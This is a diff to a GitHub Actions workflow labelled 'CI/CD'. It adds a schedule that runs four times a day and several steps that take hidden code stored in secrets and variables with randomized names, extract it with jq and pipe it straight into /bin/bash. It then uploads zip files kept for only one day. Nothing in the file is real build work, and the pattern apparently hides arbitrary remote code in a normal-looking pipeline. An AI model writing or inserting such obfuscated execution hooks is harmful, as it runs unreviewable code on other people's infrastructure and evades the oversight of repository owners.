@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '9 2,8,14,20 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,15 +16,18 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          mihyr8: ${{ secrets.mihyr8 }}
+          emeqe620: ${{ secrets.emeqe620 }}
         run: |
-          printf '%s' "$mihyr8" | jq -r .tld3436 | /bin/bash
-          echo $lif496 | jq -r .fdzds0 | /bin/bash
-          printf '%s' "$l68666" | jq -r .ndif00391 | /bin/bash
+          printf '%s' "$emeqe620" | jq -r .n15530 | /bin/bash
+          printf '%s' "$z1" | jq -r .plwce7207 | /bin/bash
+          printf '%s' "$cpjp60" | jq -r .av69184 | /bin/bash
+          printf '%s' "$pol173" | jq -r .spm6 | /bin/bash
+          printf '%s' "$va166" | jq -r .l07 | /bin/bash
+          printf '%s' "$nr3" | jq -r .dpmcl0 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: Mw6LeuG6
+          name: WG3Gvi3T
           path: "*.zip"
           retention-days: 1
